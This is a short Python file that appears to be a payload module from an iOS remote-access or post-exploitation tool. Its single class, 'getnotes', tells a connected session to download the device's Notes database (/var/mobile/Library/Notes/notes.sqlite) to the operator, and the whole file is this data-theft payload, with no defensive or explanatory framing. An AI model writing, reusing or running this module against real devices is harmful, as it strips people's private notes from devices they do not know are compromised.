class payload:
    def __init__(self):
        self.name = "getnotes"
        self.description = "download notes database"
        self.type = "download"
        self.id = 122

    def run(self,session,server,command):
        server.sendCommand("download","/var/mobile/Library/Notes/notes.sqlite","download",session.conn)
        return ""
